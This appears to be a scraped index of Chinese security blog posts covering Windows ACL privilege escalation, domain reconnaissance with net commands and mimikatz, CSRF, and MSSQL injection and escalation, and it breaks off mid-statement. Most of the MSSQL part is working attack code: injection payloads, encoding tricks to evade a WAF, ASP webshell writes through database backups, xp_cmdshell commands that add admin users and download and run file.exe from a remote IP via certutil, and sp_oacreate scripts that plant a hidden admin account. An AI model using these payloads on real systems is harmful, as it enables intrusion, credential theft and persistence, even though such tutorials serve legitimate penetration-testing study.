Windows中高权限服务、进程所拥有的文件、目录如果存在着ACL设置不当，对低权限用户开放了“写”甚至“执行”权限，低权限用户可以通过修改、替换文件内容来达到执行指定代码的目的。\n例如Windows的System332目录如果开放了写权限,则可以向目录写入一个DLL,等待系统重新启动,由 Svchost等程序加载即可实现权限提升。\nACL检查   Sysinternalsuit提供的accesschk.exe可以对指定的目录、文件进行ACL检查。命令为accesschk.exe -w -s directory ，其中directory为需要检测的目录。\n  accesschk.exe可以审计进程对所有用户组开放的权限。采用命令accesschk.exe -p pid可以获取某个进程开放的权限，其中pid可以用*代，表示检测所有进程对不同用户组开放的权限。为了保证正常运行,运行accesschk.exe时需要较高的权限。\n  accesschk.exe同样可用于审计服务，通过命令accesschk.exe -c *可审计所有服务对所有用户组开放的权限。\n  注册表中的启动项、服务加载项如果对低权限用户开放了写权限，低权限用户可以向这些表项写入指定的文件，等待系统重新启动后实现权限提升。使用命令accesschk.exe -w -s -k HKLM，表示递归扫描HKLM中开放了写权限的表项。\n  进程ACL利用 当检查发现存在低权限用户对某高权限进程有读写权限，可有如下两种方式进行利用：\n 第一种  通过OpenProcess获取进程句柄，并将目标代码写入该进程空间中，以该进程的权限运行这些代码，运行代码权限为该进程权限。\n 第二种  通过OpenProcess获取进程句柄，再通过OpenProcessToken获取该进程的Token，并利用该Token通过CreateProcessAsUser创建新的进程，新的进程权限和目标进程权限一致。\n相关漏洞 MS10-059：\n一些Windows应用中使用了 Tracing 功能记录调试信息。使用了这个 Tracing 功能的 Windows 进程会持续监控相关子键的变化，一旦注册表值发生了变化就会立即读取该值。\r其中的一个注册表值为 FileDirectory，包含有 Windows目录名。在Local System 账号运行的服务连接到管道时拥有扮演权限的本地用户可以通过扮演为 Local System 账号（或Administrator等特权账号）提升权限。\r注册表项对 Users 组开放了 Set Value 权限，因此任何通过认证的用户都可以设置任意值。\r","date":"2021-09-10T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-6/","title":"ACL 相关"},{"content":"域信息获取及分析 基础信息获取及分析  当前主机所在域的域名、网段、域服务器 多少域 域分组、用户、主机、服务器、账户策略(口令策略等)  # 获取域信息\rwhoami\rsysteminfo\rnet user testuser2 /domain\r\r\n 注：登录脚本可用于后续攻击\n # 获取网卡、网段信息\ripconfig /all\r# 查询域\rnet view /domain\r# 该命令有时候会报6118错误，可通过开启 Computer Browser服务解决\r# 查询域内组信息\rnet group /domain\rGet-DomainGroup | select distinguishedname\r# 获取相关组成员信息\rnet user /domain\rnet group \u0026quot;domain users\u0026quot; /domain\rnet group \u0026quot;domain admins\u0026quot; /domain\r# 获取域成员计算机列表\rnet group \u0026quot;domain computers\u0026quot; /domain\r# 获取域控制器计算机列表\rnet group \u0026quot;domain controllers\u0026quot; /domain\r 写脚本流程化跑一下获取信息的命令\n 相关工具  csvde(只获取所有信息，不筛选)  csvde -m -f output.csv\r ldifde  获取对象信息及特性 Get-ADObject 对象名\r 用户信息  \r\n\r\n 主机信息  \r\n 针对某些未知含义的时间信息，可以用Get-Date去解析。\n 组策略获取及分析 组策略存放位置：\n\\$DCServer\\sysvol\\域名\\policies\r\\$DCServer\\sysvol\\域名\\scripts (用户登录之后需不需要执行脚本)\r组策略获取：\n# IPC连接DC\rnet use \\\\DC.hack.testlab\r\r\n# 查看共享资源\rnet view \\\\DC.hack.testlab\r\r\n# 列出共享文件夹下的资源\rdir \\\\DC.hack.testlab\\sysvol\\hack.testlab\\\rdir \\\\DC.hack.testlab\\sysvol\\hack.testlab\\Policies\r\r\n\r\n# 拷贝策略文件\rxcopy.exe \\\\DC.hack.testlab\\sysvol\\hack.testlab\\Policies . /E\r分析组策略的功能和作用域-使用Policy Analyzer 工具：\n该工具会将所导入的组策略与本地组策略进行对比分析。\n\r\n口令NTLM获取及分析 mimikatz工具 常用命令:\nprivilege::debug //权限提升\rsekurlsa::logonpasswords //抓取明文密码\rlsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump\r\r\n安全日志获取及分析 所在路径：C:\\Windows\\System32\\winevt\\Logs\\Security.evtx，从日志中想要获得的相关信息：\n 高权限用户的登录 特定账号的登录 远程桌面的登录  获取方式  文件拷贝 Get-EventLog-LogName Security | Format-List -Property * | Out-File result.txt  分析 系统自带工具 需要明确一些事件id的含义，方便筛选。\n筛选事件id：\n\r\nLog Parser ..\n","date":"2021-09-10T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-2/","title":"域信息获取及分析"},{"content":"域相关概念 应用服务器区：OA、开发、数据库等\n网络代理：内网出网代理、多层代理\n\r\n 场景\n原本DMZ区是不能访问内网的，比如DMZ区有邮件服务器(可以有两种认证实现：第一种即自己构建认证机制；第二种是依赖认证服务器进行认证)，如果采用第二种认证实现：依赖于内网的认证服务器，那么一旦DMZ区沦陷就会将认证服务器暴露出来\n折合解决方法\n在DMZ区建一台域服务器，要求该域服务器只能从内网认证服务器进行读，而不能向内网认证服务器进行写。\n\r\nDSRM password：恢复模式密码，当自身故障不能恢复时，需要大的xx来进行恢复\n 基本概念 域(Domain) 域是企业网络中人为定义的一组计算机和用户的集合，目的是统一集中管理，具有严格的安全边界(一个域中的用户无法访问另一个域中的资源)\n域控制器(Domain Server) 域内一台具备管理功能的服务器。域控制器负责所有连入的计算机和用户的验证工作(存放活动目录)。\n作用 其存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算机要进入域，DS首先鉴别该计算机是否属于这个域，以及用户使用的账号是否存在、密码是否正确。\n域中的环境 父子域 一般同一个域内的信息交互式非常多的，且不压缩，占用带宽较大，所以需要在网络中划分多个域，多个域之间的交互式较少的，且可以压缩。第一个域称为父域，各分部的域称为该域的子域。\n第一种-自己划分形成父子域：\n\r\n第二种-建立和其他域的信任关系形成父子域：\n\r\n域森林 域树(父子域)通过建立信任关系组成集合成为域森林。\n域森林间 森林与森林间建立信任关系：\n\r\n域名服务器 域中的计算机使用DNS来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是DNS域的名字。\n内网环境中，一般是通过寻找DNS服务器来确定域控制器的位置(DNS服务器和域控制器一般配置在同一台机器上)。\n活动目录 目录用于存储有关网络对象(用户、组、计算机、共享资源、打印机和联系人等)的信息。目录服务帮助用户快速、准确找到其所需要的信息。活动目录的实现为企业提供了网络环境的集中式管理机制。\n活动目录更像一本字典的索引。\n举例 甲公司分有财务科、人事科等，分为为每个科建立一个域，可将这几个域构成域树交给甲公司管理；甲公司、乙公司等属于A集团，那么每个公司的域树可构成域森林交给A集团管理。因此A集团可以按**\u0026ldquo;A集团(域森林)-\u0026gt;子公司(域树)-\u0026gt;部门(域)-\u0026gt;员工\u0026quot;的方式对网络进行层次分明的管理**。\n功能  账号集中管理：所有账号均存储在服务器中 软件集中管理：统一推送软件、安装网络打印机等 环境集中管理：统一客户端桌面、TCP/IP协议等设置 增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户计算机权限、统一制定用户密码策略  DS和活动目录的关系 在规模较大的网络中，将计算机、用户、用户组、打印机、共享文件等多个对象有序放在一起，并将检索信息整理好以便查找和使用。这个拥有层次结构的数据库就是活动目录数据库，简称AD库。\n将AD库放在一台计算机上，那么这台计算机就称为DC。\n域中计算机的分类 域控制器 用于管理所有的网络访问。\n可以有多台计算机被配置为DS，以分担用户的登录、访问操作。多个DS可以一起工作，自动备份用户账户和活动目录数据。\n成员服务器 加入了域但没有安装AD的应用服务器、文件服务器、数据库服务器等\n客户机 用户利用客户机和域账号即可登录进入某个域。\n独立服务器 独立服务器和域没有关系。即：不加入域也不安装AD。\n域分组 组是用户账号的集合。通过向一组用户分配权限，就可不必为每个用户分别分配权限。\n域本地组 只能作用于特定对象，例如证书发布、打印操作、备份操作等。\n全局组 只能作用于本域，不能跨域或跨森林。\n一般每个全局组都有一个自己的名字，以便区分和使用。\n通用组 作用于整个森林域，表示在整个森林内部的所有域间通用，因此该组的变动尽可能小(每次变动都要同步更新到全局数据库中)。\n组之间的关系 域本地组不能加入其他安全组；全局组可以加入到全局组、通用组、域本地组；通用组可以加入到通用组、域本地组\n 通用组涉及跨域，即其他域的成员可以加入通用组\n \r\n 域本地组直接对应资源。一个用户加入域中，会被分配至某个全局组；而域本地组成员一般是全局组，全局组成员才是用户。\n通用组比较特殊，只存在于森林的根域中，所以其成员只能是根域的全局组；同时，由于通用组作用范围为森林内部的所有域，所以当作用于特定域(例如下图中的A域)时，该通用组又隶属于A域的某个域本地组，得以访问A域的资源。\n \r\n\r\n 例如Enterprise Admins是一个通用组，它的成员是：\n\r\n而当它作用于hack域时，又隶属于某个域本地组：\n\r\n 常见的组  域管理组(Domain Admins)  对域内所有控制器、服务器、主机和活动目录有完全的控制权限。隶属于Users容器，容器路径：CN=Domain Admins,CN=Users,DC=hack,DC=testlab。\n 管理员组(Administrators)  该组仅对域服务器和活动目录有完全控制权，是域本地组范畴。隶属于Builtin容器，容器路径：CN=Administrators,CN=Builtin,DC=hack,DC=testlab。\n 注意：\nDomain Admins和Administrators并不相同，前者为域全局组而后者为域本地组，且Domain Admins组是Administrators组的成员。\n  企业管理组(Enterprise Admins)，是通用组范畴，只存在于根域，每个子域将该组加入本域的Administrators组，因而具备在当前子域的完全控制权限。  ","date":"2021-09-10T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-1/","title":"域相关概念"},{"content":"CSRF相关 简述 跨站请求伪造(CSRF)，本质是诱使用户在已经认证成功的Web应用中执行非本意的敏感操作。\n与XSS的异同：\nXSS本质是html代码中的注入，利用的是Web应用对站内用户的信任；而CSRF则是通过伪装成特定网站的受信任用户去执行敏感操作。\nXSS可获取用户Cookie等身份信息，而CSRF仅仅是模仿伪装，并没有获取用户身份信息。\n原理 前提\n  Cookie值是从本地存储中取出并填充进数据包\n  用户必须在同一个浏览器中点开链接\n  目标后台身份验证机制不健全(仅有Cookie机制，缺少其他验证)\n  原理\n当某个用户访问目标网站并认证成功获得Cookie后，攻击者通过伪造用户身份(利用已经获得的Cookie)向目标网站发起敏感请求，而目标网站认为此Cookie有效，误认为此请求是真实用户发起，便响应请求。\n\r\n利用方式 GET # 假设一个简单的修改密码的场景\rhttp://example.com/haha?password1=123456\u0026amp;password2=123456\u0026amp;op=change\r 直接构造URL，诱使用户更改密码 短链接 使用html标签实现无感触发  # 可配合XSS \u0026lt;script src=\u0026#34;http://example.com/haha?password1=123\u0026amp;password2=123\u0026amp;op=change\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; # style=\u0026#34;display:none;\u0026#34; \u0026lt;iframe src=\u0026#34;http://example.com/haha?password1=123\u0026amp;password2=123\u0026amp;op=change\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; # border=\u0026#34;0\u0026#34; style=\u0026#34;display:none;\u0026#34; \u0026lt;img src=\u0026#34;http://example.com/haha?password1=123\u0026amp;password2=123\u0026amp;op=change\u0026#34; border=\u0026#34;0\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt; POST POST方式下攻击者可提供一个存在HTML表单自动提交的页面。\n\u0026lt;form action=\u0026quot;http://example.com/haha?\u0026quot; id=\u0026quot;csrf\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password1\u0026quot; value=\u0026quot;123\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password2\u0026quot; value=\u0026quot;123\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;op\u0026quot; value=\u0026quot;change\u0026quot;\u0026gt;\r\u0026lt;/form\u0026gt;\rJSON JSON CSRF 与普通 CSRF 的区别在于 ：\n JSON 数据无法像 post 那样通过一般HTML表单进行构造 且Content-Type 一般要求为 application/json，也无法通过表单构造  虽然 XMLHttpRequest、fetch 能构造出 JSON 请求，并且可以设置 Content-Type，但是无法跨域。\n未验证或未严格验证 Content-Type 头 和 JSON 格式  利用 JSON 格式容错性，例如加入=号仍然可以被解析  {\u0026quot;name\u0026quot;: \u0026quot;haha\u0026quot;, \u0026quot;age\u0026quot;: 18}=\r 伪造 JSON 格式  \u0026lt;input name='{\u0026quot;name\u0026quot;:\u0026quot;haha\u0026quot;,\u0026quot;age\u0026quot;: 18, \u0026quot;test\u0026quot;:\u0026quot;' value='test\u0026quot;}' type='hidden'\u0026gt; 严格验证 Content-Type 头 和 JSON 格式 一般情况下需要 Flash + 307 重定向(但实际情况下 Flash 一般都会被禁用)。\n Flash 文件 跨域 XML 文件(如果 flash 文件和 PHP 同域，则不需要) 具有 307 状态码的PHP文件(307跟其他 3XX HTTP 状态码之间的区别就在于，HTTP 307 可以确保重定向请求发送之后，请求方法和请求主体不会发生任何改变)  \r\n参考：\nJSON CSRF 1\nJSON CSRF 2\n防御方式 Referer头 限制Referer头必须为本站相关。当然该值可随意修改，因此不可信。\nToken CSRF 成功的原因就在于站点对于用户身份的辨别完全依赖于 Cookie，因此攻击者可以直接使用用户的 Cookie 来完成认证以执行敏感操作。\n所以可在请求中加入一个随机产生的由服务端维护的Token，服务器接收到用户请求后会验证 Token，如果无 Token 或者 Token 不正确的请求都会直接丢弃。\n 注意：\n既然是向页面内的请求中加入Token，就需要辨别内外链，如果是外链也加入Token，当攻击者诱使用户访问攻击者在目标站内所设的外链，则会泄露Token。\n SameSite  同站判断规则：\n根据 Mozilla 维护的公共后缀表(Pulic Suffix List)中的有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同来判断是否是同站请求。\n Cookie的SameSite属性用来限制第三方Cookie。\n有三个值：Strict、Lax、None\n Strict  最为严格，完全禁止第三方Cookie。当跨站点时，任何情况下都不会带有Cookie。\n Lax  相对放宽，但大多数情况也是不发送第三方Cookie。\n其允许导航到目标网址的GET请求:\n   请求类型 示例 正常情况 Lax     链接 \u0026lt;a href=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; 发送 发送   预加载 \u0026lt;link rel=\u0026quot;prerender\u0026quot; href=\u0026quot;...\u0026quot;/\u0026gt; 发送 发送   GET 表单 \u0026lt;form method=\u0026quot;GET\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; 发送 发送   POST 表单 \u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; 发送 不发送   iframe \u0026lt;iframe src=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; 发送 不发送   AJAX $.get(\u0026quot;...\u0026quot;) 发送 不发送   Image \u0026lt;img src=\u0026quot;...\u0026quot;\u0026gt; 发送 不发送     None  None是无限制。\nChrome升级到85版本后SameSite默认值由None变为Lax。用户可以修改其为None，但必须设置Secure属性(Cookie只能通过 HTTPS 协议发送)，否则无效。\n多次验证 对敏感请求加入验证码等验证机制，这样防御效果好，但会降低体验。\n对于json格式CSRF的防御 严格校验 Content-Type 和 数据体格式\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/csrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/csrf/","title":"CSRF 相关"},{"content":"MSSQL注入与提权相关 SQL Server简介 系统数据库 \r\n  master：用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。\n  model：SQL Server 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础\n  msdb：由 Enterprise Manager 和 Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。\n  tempdb：它为临时表和其他临时工作提供了一个存储区。\n   master数据库存储了所有数据库名和存储过程，类似MySQL中的information_schema 元数据库。\n \r\n视图表master.dbo.sysdatabases存储所有数据库名，其他数据库则存储本库的表名和列名；每一个库的视图表syscolumns存储所有的字段；可编程性存储函数。\n查询所有数据库名：\nselect name from master.dbo.sysdatabases;\r\r\nsysobjects表字段 在数据库中创建的每个对象（例如约束、默认值、日志、规则以及存储过程）都对应一行。\nselect name,xtype from sysobjects;\r查询返回结果中，xtype可以是如下：\n C = CHECK 约束 D = 默认值或 DEFAULT 约束 F = FOREIGN KEY 约束 L = 日志 FN = 标量函数 IF = 内嵌表函数 P = 存储过程 PK = PRIMARY KEY 约束（类型是 K） RF = 复制筛选存储过程 S = 系统表 TF = 表函数 TR = 触发器 U = 用户表 UQ = UNIQUE 约束（类型是 K） V = 视图 X = 扩展存储过程  \r\nSQL Server 信息收集 权限判断 SQL Server有三大主体：\n Windows 级别主体 服务器级别主体 数据库级别主体  \r\n服务器级别角色 SQL Server 提供服务器级角色以帮助你管理服务器上的权限。 这些角色是可组合其他主体的安全主体。 服务器级角色的权限作用域为服务器范围。 （“角色”类似于 Windows 操作系统中的“组”。）\n\r\n可使用IS_SRVROLEMEMBER ( 'role' [ , 'login' ] ) 来判断登录名是否为指定服务器角色的成员，该函数有如下返回值：\n   返回值 描述     0 login 不是 role 的成员。   1 login 是 role 的成员。   NULL role 或 login 无效，或者没有查看角色成员身份的权限。    因此可通过如下语句判断登录名的服务器角色：\nand 1=(select is_srvrolemember('sysadmin'))\rand 1=(select is_srvrolemember('serveradmin'))\rand 1=(select is_srvrolemember('setupadmin'))\rand 1=(select is_srvrolemember('securityadmin'))\rand 1=(select is_srvrolemember('diskadmin'))\rand 1=(select is_srvrolemember('bulkadmin'))\r 使用sqlmap的-is-dba可判断是否为管理员权限。\n 数据库级别角色 数据库级角色的权限作用域为数据库范围。\n\r\n可使用select IS_MEMBER('db_owner')判断当前用户是否为指定 Microsoft Windows 组或 SQL Server 数据库角色的成员。\nand 1=(select is_member('db_owner'))\r基本信息获取 # 数据库版本\rselect @@version\r# 获取当前登录用户名\rselect user\r# 获取当前数据库名\rselect db_name()\r# 遍历其他数据库\rselect db_name(n)\r# 是否支持多语句查询\r;select user\r站库分离判断  判断数据库服务器名和Web应用服务器名是否相等。  select * from info where id='1' and host_name()=@@servername;--'\r 也可调用xp_cmdshell通过cmd命令判断  SQL Server 基本语法 注释与空白符  注释  /**/\r--\r;%00\r 空白符  01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20\rselect CHAR(01)\r/**/\r运算符 + 加法运算\r- 减法运算\r* 乘法运算\r/ 除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去\r% 取模运算，返回两数相除后的余数\r\u0026amp; 位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0\r| 位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0\r^ 位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0\r= 等于 \u0026lt;\u0026gt; 不等于\r\u0026gt; 大于 != 不等于\r\u0026lt; 小于 !\u0026lt; 不小于\r\u0026gt;= 大于或等于 !\u0026gt; 不大于\r\u0026lt;= 小于或等于\rALL 如果一组的比较都为 true，则比较结果为 true\rAND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false\rANY 如果一组的比较中任何一个为 true，则结果为 true\rBETWEEN 如果操作数在某个范围之内，那么结果为 true\rEXISTS 如果子查询中包含了一些行，那么结果为 true\rIN 如果操作数等于表达式列表中的一个，那么结果为 true\rLIKE 如果操作数与某种模式相匹配，那么结果为 true\rNOT 对任何其他布尔运算符的结果值取反\rOR 如果两个布尔表达式中的任何一个为 true，那么结果为 true\rSOME 如果在一组比较中，有些比较为 true，那么结果为 true\rMSSQL 注入 显错注入 原理 MSSQL中的报错主要靠的是数据类型转换时会进行报错回显。其中类型转换味蕾两类：隐式转换和显示转换。\n 隐式转换  select * from admin where id =1 and (select user)\u0026gt;0--\rselect * from admin where id =1|(select user)--\r在将 varchar类型的 'dbo' 数据转换成 int 时失败，从而报错回显。\r 显示转换  一般利用函数进行转换从而报错，例如cast和convert函数。\nselect * from admin where id =1 (select CAST(USER as int))\rselect * from admin where id =1 (select convert(int,user))\r利用  获取当前数据库  select * from fsb_users where user_id = 1 and db_name()\u0026gt;0;--\r\r\n 获取表  select * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype='u');--\r\r\n在得到一个表后，想要暴其他表时，加入判断条件即可：\nselect * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_messages'));--\r\r\n 获取字段  select * from fsb_users where user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_users') and name not in ('user_id'));--\r\r\n 获取数据  select * from fsb_users where user_id=1 and 1=(select top 1 user_name+':'+password from fsb_users);--\r\r\n 其他用法  # 获取表名\rid=1 and 1=(select top 1 table_name from information_schema.tables);--\r# 获取当前表明和列名\ruser_id=1 having 1=1\r\r\n# 暴出其他字段\ruser_id=1 group by fsb_users.user_id,fsb_users.user_name having 1=1\r\r\n简单绕过 declare函数时MSSQL中声明局部变量的函数，可用他绕过WAF对关键字的拦截：\nselect * from fsb_users where user_id=1;declare @a nvarchar(2000) set @a='select convert(int,@@version)' exec(@a) --\rdeclare定义变量，set设置变量值，exec执行变量\r\r\n其中变量值支持HEX和ascii码，在过滤引号情况下可以编码绕过：\nselect * from fsb_users where user_id=1;declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)--\rselect * from fsb_users where user_id=1;declare @s varchar(2000) set @s= CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@s)--\r盲注 和MySQL中利用思路类似：分割字符并比较。\nbool盲注 # 暴数据库\rid=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) \u0026gt;= 97\r# 暴数据：test数据库中users表中password列中第一行数据的第一个字符的ascii值\rand unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))\u0026gt;N\r时间型盲注 id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--\rid=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))\u0026gt;1 WAITFOR DELAY '0:0:5'--\r联合注入 MSSQL中的联合查询使用null占位，不使用数字占位是因为可能发生隐式转换。\n利用 # 查列数\ruser_id=1 order by 5\r# 查数据\ruser_id=1 union select null,user_name,password,null,null from fsb_users\r# 结合报错的union\r1 ;SELECT 1 UNION (select CAST(USER as int))\r\rimage-20220218153256017\r\nMSSQL 提权 首先判断权限:\n  DB_OWNER权限：备份拿shell\n  SA权限：xp_cmdshell和sp_oacreate提权\n  备份拿shell 备份拿shel的原理就是在备份过程中写入一句话木马。\nMSSQL中常见的备份策略：\n 每周一次完整备份 每天一次差异备份 每小时一次事务日志备份  利用备份拿shell需要知道网站根路径信息，且需要网站目录的写权限等。\n寻找路径 一般有以下几个思路：\n 报错信息中找 字典暴破 旁站信息收集 调用存储过程搜索 读取配置文件之类  一般可用xp_cmdshell、xp_dirtree、xp_subdirs来搜索目录信息。\n xp_dirtree  execute master..xp_dirtree 'c:' //列出所有 c:\\ 文件和目录,子目录 execute master..xp_dirtree 'c:',1 //只列 c:\\ 文件夹 execute master..xp_dirtree 'c:',1,1 //列 c:\\ 文件夹加文件 \r\n当执行xp_dirtree没有回显时，可创建临时表，并将执行结果插入到表中：\nid=1;CREATE TABLE temp (dir varchar(8000),num1 int,num2 int);\rid=1;insert into temp(dir,num1,num2) execute master..xp_dirtree 'c:',1,1\r xp_cmdshell  使用cmd命令搜索test.aspx：\nfor /r c:\\ %i in (test.aspx) do @echo %i\r\r\n不回显情况：\nid=1;CREATE TABLE temp (dir varchar(8000));\rid=1;insert into temp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (test.aspx) do @echo %i'\r 当xp_cmdshell不能调用或报错，一般是SQL Server 阻止了对组件 xp_cmdshell 的过程 sys.xp_cmdshell 的访问。\n系统管理员可以通过使用 sp_configure 启用xp_cmdshell ：\n# 允许修改高级参数 ;EXEC sp_configure 'show advanced options',1;RECONFIGURE;\r# 打开xp_cmdshell 扩展\r;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\r关闭xp_cmdshell ：\n# 允许修改高级参数 ;EXEC sp_configure 'show advanced options',1;RECONFIGURE;\r# 打开xp_cmdshell 扩展\r;EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;\r;EXEC sp_configure 'show advanced options',0;RECONFIGURE;\r Log备份 利用Log备份的条件：\n 已有一次完整的备份文件，即某数据库下得有一个该库的备份文件，且恢复模式必须是完整模式 知晓网站根路径且可写 支持堆叠注入  # 设置恢复模式是完整模式\ralter database 库名 set RECOVERY FULL create table cmd (a image) # 先进行一次完整备份，这样就有备份文件\rbackup log 库名 to disk = 'c:\\xxx' with init # 插入asp一句话木马`\u0026lt;%execute(request(\u0026quot;a\u0026quot;))%\u0026gt;`\rinsert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) # 将操作日志备份进asp中\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r# 删除掉cmd表\rdrop table cmd; 差异备份 利用差异备份的条件：\n 知晓网站根路径且可写 支持堆叠注入  # 完整备份一次(保存位置可以改)\rbackup database 库名 to disk = 'c:\\bak.bak';--\rcreate table cmd (a image);\r# 创建表 cmd 并插入一句话木马\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);\r# 进行差异备份(只备份变化的部分)\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;\rxp_cmdshell  测试 xp_cmdshell 是否可以执行  exec master..xp_cmdshell 'ver'\r或\rexecute('xp_cmdshell \u0026quot;whoami\u0026quot;')  添加管理员获取控制权  exec master.dbo.xp_cmdshell 'net user hack hack123456 /add'\rexec master.dbo.xp_cmdshell 'net localgroup administrators hack /add'\r 下载远程马，上线获取控制权  exec master.dbo.xp_cmdshell 'cd c:\\www \u0026amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe';\rexec master.dbo.xp_cmdshell 'cd c:\\www \u0026amp; file.exe';\r Certutil 是一个 CLI 程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。\nCertutil 是 Windows 操作系统上预装的工具，可用于 校验文件MD5、SHA1、SHA256，下载恶意文件和免杀。\n sp_oacreate 当xp_cmdshell出问题时，也可考虑用sp_oacreate。\nsp_oacreate可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd，不过这种方式没有回显。\n 注：\n所有涉及到写入的操作都需要根据当前用户是否有权限。\n  当被阻止时，可开启该过程  EXEC sp_configure 'show advanced options',1;RECONFIGURE;\rEXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE\r 恢复  exec sp_configure 'show advanced options',1;reconfigure;\rexec sp_configure 'ole automation procedures',0;reconfigure;\rexec sp_configure 'show advanced options',0;reconfigure;\r利用：\n 调用cmd写用户  # wscript.shell 执行命令\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user hack Password@ /add'\r# Shell.Application 执行命令\rdeclare @o int\rexec sp_oacreate 'Shell.Application', @o out\rexec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user \u0026gt;c:\\test.txt','c:\\windows\\system32','','1';\r 启动项写用户  declare @sp_passwordxieo int, @f int, @t int, @ret int\rexec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out\rexec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\\RECYCLER\\1.vbs', 1\rexec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(\u0026quot;WSCRIPT.NETWORK\u0026quot;)'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'os=\u0026quot;WinNT://\u0026quot;\u0026amp;wsnetwork.ComputerName'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os\u0026amp;\u0026quot;/Administrators,group\u0026quot;)'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(\u0026quot;user\u0026quot;,\u0026quot;123$\u0026quot;)'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword \u0026quot;123\u0026quot;'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os\u0026amp;\u0026quot;/123$\u0026quot;,user)'\rexec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os\u0026amp;\u0026quot;/123$\u0026quot;';\r 知晓路径并可写情况下，也可以将命令执行结果写入网站目录下，再去读取该文件即可  declare @shell int;\rexec sp_oacreate 'wscript.shell',@shell output;\rexec sp_oamethod 